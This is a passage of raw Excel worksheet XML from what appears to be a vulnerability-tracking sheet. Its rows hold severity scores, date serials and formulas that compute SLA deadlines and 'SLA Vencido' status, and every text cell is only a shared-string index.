      <c r="H119" s="9" t="s">
        <v>2569</v>
      </c>
      <c r="I119" s="6" t="s">
        <v>2570</v>
      </c>
      <c r="J119" s="4" t="s">
        <v>2571</v>
      </c>
      <c r="K119" s="4"/>
      <c r="L119" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M119" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N119" s="5">
        <v>3.8</v>
      </c>
      <c r="O119" s="6"/>
      <c r="P119" s="6"/>
      <c r="Q119" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R119" s="4">
        <v>444</v>
      </c>
      <c r="S119" s="22"/>
      <c r="T119" s="8">
        <v>45628</v>
      </c>
      <c r="U119" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V119" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W119" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X119" s="11"/>
      <c r="Y119" s="11"/>
      <c r="Z119" s="11"/>
      <c r="AA119" s="8"/>
      <c r="AB119" s="9" t="s">
        <v>2572</v>
      </c>
      <c r="AC119" s="9" t="s">
        <v>2573</v>
      </c>
      <c r="AD119" s="32" t="s">
        <v>2574</v>
      </c>
      <c r="AE119" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF119" s="9"/>
      <c r="AG119" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="120" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A120" s="5">
        <v>119</v>
      </c>
      <c r="B120" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C120" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D120" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E120" s="4"/>
      <c r="F120" s="4"/>
      <c r="G120" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H120" s="9" t="s">
        <v>2575</v>
      </c>
      <c r="I120" s="6" t="s">
        <v>2576</v>
      </c>
      <c r="J120" s="4" t="s">
        <v>1271</v>
      </c>
      <c r="K120" s="4"/>
      <c r="L120" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M120" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N120" s="5">
        <v>3.8</v>
      </c>
      <c r="O120" s="6"/>
      <c r="P120" s="6"/>
      <c r="Q120" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R120" s="4">
        <v>444</v>
      </c>
      <c r="S120" s="22"/>
      <c r="T120" s="8">
        <v>45628</v>
      </c>
      <c r="U120" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V120" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W120" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X120" s="11"/>
      <c r="Y120" s="11"/>
      <c r="Z120" s="11"/>
      <c r="AA120" s="8"/>
      <c r="AB120" s="9" t="s">
        <v>2577</v>
      </c>
      <c r="AC120" s="9" t="s">
        <v>2578</v>
      </c>
      <c r="AD120" s="32" t="s">
        <v>2579</v>
      </c>
      <c r="AE120" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF120" s="9"/>
      <c r="AG120" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="121" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A121" s="5">
        <v>120</v>
      </c>
      <c r="B121" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C121" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D121" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E121" s="4"/>
      <c r="F121" s="4"/>
      <c r="G121" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H121" s="9" t="s">
        <v>2580</v>
      </c>
      <c r="I121" s="6" t="s">
        <v>2581</v>
      </c>
      <c r="J121" s="4" t="s">
        <v>1613</v>
      </c>
      <c r="K121" s="4"/>
      <c r="L121" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M121" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N121" s="5">
        <v>3.8</v>
      </c>
      <c r="O121" s="6"/>
      <c r="P121" s="6"/>
      <c r="Q121" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R121" s="4">
        <v>444</v>
      </c>
      <c r="S121" s="22"/>
      <c r="T121" s="8">
        <v>45628</v>
      </c>
      <c r="U121" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V121" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W121" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X121" s="11"/>
      <c r="Y121" s="11"/>
      <c r="Z121" s="11"/>
      <c r="AA121" s="8"/>
      <c r="AB121" s="9" t="s">
        <v>2582</v>
      </c>
      <c r="AC121" s="9" t="s">
        <v>2583</v>
      </c>
      <c r="AD121" s="32" t="s">
        <v>2584</v>
      </c>
      <c r="AE121" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF121" s="9"/>
      <c r="AG121" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="122" spans="1:33" ht="72.5" x14ac:dyDescent="0.35">
      <c r="A122" s="5">
        <v>121</v>
      </c>
      <c r="B122" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C122" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D122" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E122" s="4"/>
      <c r="F122" s="4"/>
      <c r="G122" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H122" s="9" t="s">
        <v>2585</v>
      </c>
      <c r="I122" s="6" t="s">
        <v>2586</v>
      </c>
      <c r="J122" s="4" t="s">
        <v>2527</v>
      </c>
      <c r="K122" s="4"/>
      <c r="L122" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M122" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N122" s="5">
        <v>3.8</v>
      </c>
      <c r="O122" s="6"/>
      <c r="P122" s="6"/>
      <c r="Q122" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R122" s="4">
        <v>444</v>
      </c>
      <c r="S122" s="22"/>
      <c r="T122" s="8">
        <v>45628</v>
      </c>
      <c r="U122" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V122" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W122" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X122" s="11"/>
      <c r="Y122" s="11"/>
      <c r="Z122" s="11"/>
      <c r="AA122" s="8"/>
      <c r="AB122" s="9" t="s">
        <v>2587</v>
      </c>
      <c r="AC122" s="9" t="s">
        <v>2529</v>
      </c>
      <c r="AD122" s="32" t="s">
        <v>2530</v>
      </c>
      <c r="AE122" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF122" s="9"/>
      <c r="AG122" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="123" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A123" s="5">
        <v>122</v>
      </c>
      <c r="B123" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C123" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D123" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E123" s="4"/>
      <c r="F123" s="4"/>
      <c r="G123" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H123" s="9" t="s">
        <v>2588</v>
      </c>
      <c r="I123" s="6" t="s">
        <v>2589</v>
      </c>
      <c r="J123" s="4" t="s">
        <v>1625</v>
      </c>
      <c r="K123" s="4"/>
      <c r="L123" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M123" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N123" s="5">
        <v>3.8</v>
      </c>
      <c r="O123" s="6"/>
      <c r="P123" s="6"/>
      <c r="Q123" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R123" s="4">
        <v>444</v>
      </c>
      <c r="S123" s="22"/>
      <c r="T123" s="8">
        <v>45628</v>
      </c>
      <c r="U123" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V123" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W123" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X123" s="11"/>
      <c r="Y123" s="11"/>
      <c r="Z123" s="11"/>
      <c r="AA123" s="8"/>
      <c r="AB123" s="9" t="s">
        <v>2535</v>
      </c>
      <c r="AC123" s="9" t="s">
        <v>2536</v>
      </c>
      <c r="AD123" s="32" t="s">
        <v>2537</v>
      </c>
      <c r="AE123" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF123" s="9"/>
      <c r="AG123" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="124" spans="1:33" ht="101.5" x14ac:dyDescent="0.35">
      <c r="A124" s="5">
        <v>123</v>
      </c>
      <c r="B124" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C124" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D124" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E124" s="4"/>
      <c r="F124" s="4"/>
      <c r="G124" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H124" s="9" t="s">
        <v>2590</v>
      </c>
      <c r="I124" s="6" t="s">
        <v>2591</v>
      </c>
      <c r="J124" s="4" t="s">
        <v>1635</v>
      </c>
      <c r="K124" s="4"/>
      <c r="L124" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M124" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N124" s="5">
        <v>3.8</v>
      </c>
      <c r="O124" s="6"/>
      <c r="P124" s="6"/>
      <c r="Q124" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R124" s="4">
        <v>444</v>
      </c>
      <c r="S124" s="22"/>
      <c r="T124" s="8">
        <v>45628</v>
      </c>
      <c r="U124" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V124" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W124" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X124" s="11"/>
      <c r="Y124" s="11"/>
      <c r="Z124" s="11"/>
      <c r="AA124" s="8"/>
      <c r="AB124" s="9" t="s">
        <v>2542</v>
      </c>
      <c r="AC124" s="9" t="s">
        <v>2543</v>
      </c>
      <c r="AD124" s="32" t="s">
        <v>2592</v>
      </c>
      <c r="AE124" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF124" s="9"/>
      <c r="AG124" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="125" spans="1:33" ht="87" x14ac:dyDescent="0.35">
      <c r="A125" s="5">
        <v>124</v>
      </c>
      <c r="B125" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C125" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D125" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E125" s="4"/>
      <c r="F125" s="4"/>
      <c r="G125" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H125" s="9" t="s">
        <v>2593</v>
      </c>
      <c r="I125" s="6" t="s">
        <v>2594</v>
      </c>
      <c r="J125" s="4" t="s">
        <v>1645</v>
      </c>
      <c r="K125" s="4"/>
      <c r="L125" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M125" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N125" s="5">
        <v>3.8</v>
      </c>
      <c r="O125" s="6"/>
      <c r="P125" s="6"/>
      <c r="Q125" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R125" s="4">
        <v>444</v>
      </c>
      <c r="S125" s="22"/>
      <c r="T125" s="8">
        <v>45628</v>
      </c>
      <c r="U125" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V125" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W125" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X125" s="11"/>
      <c r="Y125" s="11"/>
      <c r="Z125" s="11"/>
      <c r="AA125" s="8"/>
      <c r="AB125" s="9" t="s">
        <v>2549</v>
      </c>
      <c r="AC125" s="9" t="s">
        <v>2550</v>
      </c>
      <c r="AD125" s="32" t="s">
        <v>2551</v>
      </c>
      <c r="AE125" s="27" t="s">
        <v>1384</v>
      </c>
      <c r="AF125" s="9"/>
      <c r="AG125" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="126" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A126" s="5">
        <v>125</v>
      </c>
      <c r="B126" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C126" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D126" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E126" s="4"/>
      <c r="F126" s="4"/>
      <c r="G126" s="6" t="s">
        <v>2096</v>
      </c>
      <c r="H126" s="9" t="s">
        <v>2595</v>
      </c>
      <c r="I126" s="6" t="s">
        <v>2596</v>
      </c>
      <c r="J126" s="4" t="s">
        <v>2597</v>
      </c>
      <c r="K126" s="4"/>
      <c r="L126" s="5" t="s">
        <v>655</v>
      </c>
      <c r="M126" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N126" s="5">
        <v>3.1</v>
      </c>
      <c r="O126" s="6" t="s">
        <v>409</v>
      </c>
      <c r="P126" s="6"/>
      <c r="Q126" s="4" t="s">
        <v>2099</v>
      </c>
      <c r="R126" s="4">
        <v>444</v>
      </c>
      <c r="S126" s="22"/>
      <c r="T126" s="8">
        <v>45628</v>
      </c>
      <c r="U126" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>581</v>
      </c>
      <c r="V126" s="8">
        <f t="shared" si="4"/>
        <v>45748</v>
      </c>
      <c r="W126" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X126" s="11"/>
      <c r="Y126" s="11"/>
      <c r="Z126" s="11"/>
      <c r="AA126" s="8"/>
      <c r="AB126" s="9" t="s">
        <v>2598</v>
      </c>
      <c r="AC126" s="9" t="s">
        <v>2599</v>
      </c>
      <c r="AD126" s="32" t="s">
        <v>2600</v>
      </c>
      <c r="AE126" s="14" t="s">
        <v>2080</v>
      </c>
      <c r="AF126" s="9"/>
      <c r="AG126" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="127" spans="1:33" ht="290" x14ac:dyDescent="0.35">
      <c r="A127" s="5">
        <v>126</v>
      </c>
      <c r="B127" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C127" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D127" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E127" s="4"/>
      <c r="F127" s="4"/>
      <c r="G127" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H127" s="9" t="s">
        <v>2601</v>
      </c>
      <c r="I127" s="6" t="s">
        <v>2602</v>
      </c>
      <c r="J127" s="4" t="s">
        <v>2603</v>
      </c>
      <c r="K127" s="4"/>
      <c r="L127" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M127" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N127" s="5">
        <v>6.2</v>
      </c>
      <c r="O127" s="6"/>
      <c r="P127" s="6"/>
      <c r="Q127" s="4" t="s">
        <v>2604</v>
      </c>
      <c r="R127" s="4"/>
      <c r="S127" s="22"/>
      <c r="T127" s="8">
        <v>45630</v>
      </c>
      <c r="U127" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>579</v>
      </c>
      <c r="V127" s="8">
        <f t="shared" si="4"/>
        <v>45720</v>
      </c>
      <c r="W127" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X127" s="11"/>
      <c r="Y127" s="11"/>
      <c r="Z127" s="11"/>
      <c r="AA127" s="8">
        <v>45756</v>
      </c>
      <c r="AB127" s="9" t="s">
        <v>2605</v>
      </c>
      <c r="AC127" s="9" t="s">
        <v>2606</v>
      </c>
      <c r="AD127" s="32" t="s">
        <v>2607</v>
      </c>
      <c r="AE127" s="27"/>
      <c r="AF127" s="9" t="s">
        <v>2608</v>
      </c>
      <c r="AG127" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="128" spans="1:33" ht="116" x14ac:dyDescent="0.35">
      <c r="A128" s="5">
        <v>127</v>
      </c>
      <c r="B128" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C128" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D128" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E128" s="4"/>
      <c r="F128" s="4"/>
      <c r="G128" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H128" s="9" t="s">
        <v>2609</v>
      </c>
      <c r="I128" s="6" t="s">
        <v>2610</v>
      </c>
      <c r="J128" s="4" t="s">
        <v>2611</v>
      </c>
      <c r="K128" s="4"/>
      <c r="L128" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M128" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N128" s="5">
        <v>5.8</v>
      </c>
      <c r="O128" s="6"/>
      <c r="P128" s="6"/>
      <c r="Q128" s="4" t="s">
        <v>2612</v>
      </c>
      <c r="R128" s="4"/>
      <c r="S128" s="22"/>
      <c r="T128" s="8">
        <v>45630</v>
      </c>
      <c r="U128" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>579</v>
      </c>
      <c r="V128" s="8">
        <f t="shared" si="4"/>
        <v>45720</v>
      </c>
      <c r="W128" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X128" s="11"/>
      <c r="Y128" s="11"/>
      <c r="Z128" s="11"/>
      <c r="AA128" s="8">
        <v>45756</v>
      </c>
      <c r="AB128" s="9" t="s">
        <v>2613</v>
      </c>
      <c r="AC128" s="9" t="s">
        <v>2614</v>
      </c>
      <c r="AD128" s="32" t="s">
        <v>2615</v>
      </c>
      <c r="AE128" s="27" t="s">
        <v>2616</v>
      </c>
      <c r="AF128" s="9"/>
      <c r="AG128" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="129" spans="1:33" ht="246.5" x14ac:dyDescent="0.35">
      <c r="A129" s="5">
        <v>128</v>
      </c>
      <c r="B129" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C129" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D129" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E129" s="4"/>
      <c r="F129" s="4"/>
      <c r="G129" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H129" s="9" t="s">
        <v>2617</v>
      </c>
      <c r="I129" s="6" t="s">
        <v>2618</v>
      </c>
      <c r="J129" s="4" t="s">
        <v>2619</v>
      </c>
      <c r="K129" s="4"/>
      <c r="L129" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M129" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N129" s="5">
        <v>5.4</v>
      </c>
      <c r="O129" s="6"/>
      <c r="P129" s="6"/>
      <c r="Q129" s="4" t="s">
        <v>2612</v>
      </c>
      <c r="R129" s="4"/>
      <c r="S129" s="22"/>
      <c r="T129" s="8">
        <v>45630</v>
      </c>
      <c r="U129" s="11">
        <f t="shared" ca="1" si="3"/>
        <v>579</v>
      </c>
      <c r="V129" s="8">
        <f t="shared" si="4"/>
        <v>45720</v>
      </c>
      <c r="W129" s="12" t="str">
        <f t="shared" ca="1" si="5"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X129" s="11"/>
      <c r="Y129" s="11"/>
      <c r="Z129" s="11"/>
      <c r="AA129" s="8">
        <v>45756</v>
      </c>
      <c r="AB129" s="9" t="s">
        <v>2620</v>
      </c>
      <c r="AC129" s="9" t="s">
        <v>2621</v>
      </c>
      <c r="AD129" s="32" t="s">
        <v>2622</v>
      </c>
      <c r="AE129" s="27" t="s">
        <v>2616</v>
      </c>
      <c r="AF129" s="9"/>
      <c r="AG129" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="130" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A130" s="5">
        <v>129</v>
      </c>
      <c r="B130" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C130" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D130" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E130" s="4"/>
      <c r="F130" s="4"/>
      <c r="G130" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H130" s="9" t="s">
        <v>2623</v>
      </c>
      <c r="I130" s="6" t="s">
        <v>2624</v>
      </c>
      <c r="J130" s="4" t="s">
        <v>2625</v>
      </c>
      <c r="K130" s="4"/>
      <c r="L130" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M130" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N130" s="5">
        <v>4.7</v>
      </c>
      <c r="O130" s="6"/>
      <c r="P130" s="6"/>
      <c r="Q130" s="4" t="s">
        <v>2612</v>
      </c>
      <c r="R130" s="4"/>
      <c r="S130" s="22"/>
      <c r="T130" s="8">
        <v>45630</v>
      </c>
      <c r="U130" s="11">
        <f t="shared" ref="U130:U193" ca="1" si="6">TODAY()-T130</f>
        <v>579</v>
      </c>
      <c r="V130" s="8">
        <f t="shared" ref="V130:V193" si="7">IF(M130="Critical",T130+10,IF(M130="High",T130+30,IF(M130="Bad",T130+30,IF(M130="Medium",T130+90,IF(M130="Warm",T130+90,IF(M130="Low",T130+120,IF(M130="Fair",T130+120,IF(M130="Neutral",T130+120,""))))))))</f>
        <v>45720</v>
      </c>
      <c r="W130" s="12" t="str">
        <f t="shared" ref="W130:W193" ca="1" si="8">IF(M130="Critical",IF(U130&gt;10,"SLA Vencido","En SLA"),IF(M130="High",IF(U130&gt;30,"SLA Vencido","En SLA"),IF(M130="Bad",IF(U130&gt;30,"SLA Vencido","En SLA"),IF(M130="Medium",IF(U130&gt;90,"SLA Vencido","En SLA"),IF(M130="Warm",IF(U130&gt;90,"SLA Vencido","En SLA"),IF(M130="Low",IF(U130&gt;120,"SLA Vencido","En SLA"),IF(M130="Fair",IF(U130&gt;120,"SLA Vencido","En SLA"),IF(M130="Neutral",IF(U130&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X130" s="11"/>
      <c r="Y130" s="11"/>
      <c r="Z130" s="11"/>
      <c r="AA130" s="8">
        <v>45756</v>
      </c>
      <c r="AB130" s="9" t="s">
        <v>2626</v>
      </c>
      <c r="AC130" s="9" t="s">
        <v>2627</v>
      </c>
      <c r="AD130" s="32" t="s">
        <v>2628</v>
      </c>
      <c r="AE130" s="27"/>
      <c r="AF130" s="9" t="s">
        <v>2629</v>
      </c>
      <c r="AG130" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="131" spans="1:33" ht="130.5" x14ac:dyDescent="0.35">
      <c r="A131" s="5">
        <v>130</v>
      </c>
      <c r="B131" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C131" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D131" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E131" s="4"/>
      <c r="F131" s="4"/>
      <c r="G131" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H131" s="9" t="s">
        <v>2630</v>
      </c>
      <c r="I131" s="6" t="s">
        <v>2631</v>
      </c>
      <c r="J131" s="4" t="s">
        <v>2632</v>
      </c>
      <c r="K131" s="4"/>
      <c r="L131" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M131" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N131" s="5">
        <v>4.7</v>
      </c>
      <c r="O131" s="6"/>
      <c r="P131" s="6"/>
      <c r="Q131" s="4" t="s">
        <v>2612</v>
      </c>
      <c r="R131" s="4"/>
      <c r="S131" s="22"/>
      <c r="T131" s="8">
        <v>45630</v>
      </c>
      <c r="U131" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>579</v>
      </c>
      <c r="V131" s="8">
        <f t="shared" si="7"/>
        <v>45720</v>
      </c>
      <c r="W131" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X131" s="11"/>
      <c r="Y131" s="11"/>
      <c r="Z131" s="11"/>
      <c r="AA131" s="8">
        <v>45756</v>
      </c>
      <c r="AB131" s="9" t="s">
        <v>2633</v>
      </c>
      <c r="AC131" s="9" t="s">
        <v>873</v>
      </c>
      <c r="AD131" s="32" t="s">
        <v>2634</v>
      </c>
      <c r="AE131" s="27" t="s">
        <v>2616</v>
      </c>
      <c r="AF131" s="9"/>
      <c r="AG131" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="132" spans="1:33" ht="203" x14ac:dyDescent="0.35">
      <c r="A132" s="5">
        <v>131</v>
      </c>
      <c r="B132" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C132" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D132" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E132" s="4"/>
      <c r="F132" s="4"/>
      <c r="G132" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H132" s="9" t="s">
        <v>2635</v>
      </c>
      <c r="I132" s="6" t="s">
        <v>2636</v>
      </c>
      <c r="J132" s="4" t="s">
        <v>2637</v>
      </c>
      <c r="K132" s="4"/>
      <c r="L132" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M132" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N132" s="5">
        <v>4.5999999999999996</v>
      </c>
      <c r="O132" s="6"/>
      <c r="P132" s="6"/>
      <c r="Q132" s="4" t="s">
        <v>2612</v>
      </c>
      <c r="R132" s="4"/>
      <c r="S132" s="22"/>
      <c r="T132" s="8">
        <v>45630</v>
      </c>
      <c r="U132" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>579</v>
      </c>
      <c r="V132" s="8">
        <f t="shared" si="7"/>
        <v>45720</v>
      </c>
      <c r="W132" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X132" s="11"/>
      <c r="Y132" s="11"/>
      <c r="Z132" s="11"/>
      <c r="AA132" s="8">
        <v>45756</v>
      </c>
      <c r="AB132" s="9" t="s">
        <v>2638</v>
      </c>
      <c r="AC132" s="9" t="s">
        <v>2639</v>
      </c>
      <c r="AD132" s="32" t="s">
        <v>2640</v>
      </c>
      <c r="AE132" s="27" t="s">
        <v>2616</v>
      </c>
      <c r="AF132" s="9"/>
      <c r="AG132" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="133" spans="1:33" ht="188.5" x14ac:dyDescent="0.35">
      <c r="A133" s="5">
        <v>132</v>
      </c>
      <c r="B133" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C133" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D133" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E133" s="4"/>
      <c r="F133" s="4"/>
      <c r="G133" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H133" s="9" t="s">
        <v>2641</v>
      </c>
      <c r="I133" s="6" t="s">
        <v>2642</v>
      </c>
      <c r="J133" s="4" t="s">
        <v>2643</v>
      </c>
      <c r="K133" s="4"/>
      <c r="L133" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M133" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N133" s="5">
        <v>4</v>
      </c>
      <c r="O133" s="6"/>
      <c r="P133" s="6"/>
      <c r="Q133" s="4" t="s">
        <v>2612</v>
      </c>
      <c r="R133" s="4"/>
      <c r="S133" s="22"/>
      <c r="T133" s="8">
        <v>45630</v>
      </c>
      <c r="U133" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>579</v>
      </c>
      <c r="V133" s="8">
        <f t="shared" si="7"/>
        <v>45720</v>
      </c>
      <c r="W133" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X133" s="11"/>
      <c r="Y133" s="11"/>
      <c r="Z133" s="11"/>
      <c r="AA133" s="8">
        <v>45686</v>
      </c>
      <c r="AB133" s="9" t="s">
        <v>2644</v>
      </c>
      <c r="AC133" s="9" t="s">
        <v>2645</v>
      </c>
      <c r="AD133" s="32" t="s">
        <v>2646</v>
      </c>
      <c r="AE133" s="27" t="s">
        <v>2616</v>
      </c>
      <c r="AF133" s="9" t="s">
        <v>148</v>
      </c>
      <c r="AG133" s="27" t="s">
        <v>1422</v>
      </c>
    </row>
    <row r="134" spans="1:33" ht="159.5" x14ac:dyDescent="0.35">
      <c r="A134" s="5">
        <v>133</v>
      </c>
      <c r="B134" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C134" s="5" t="s">
        <v>33</v>
      </c>
      <c r="D134" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E134" s="4"/>
      <c r="F134" s="4"/>
      <c r="G134" s="6" t="s">
        <v>2158</v>
      </c>
      <c r="H134" s="9" t="s">
        <v>2647</v>
      </c>
      <c r="I134" s="6" t="s">
        <v>2648</v>
      </c>
      <c r="J134" s="4" t="s">
        <v>2438</v>
      </c>
      <c r="K134" s="4"/>
      <c r="L134" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M134" s="5" t="s">
        <v>111</v>
      </c>
      <c r="N134" s="5">
        <v>3.7</v>
      </c>
      <c r="O134" s="6"/>
      <c r="P134" s="6"/>
      <c r="Q134" s="4" t="s">
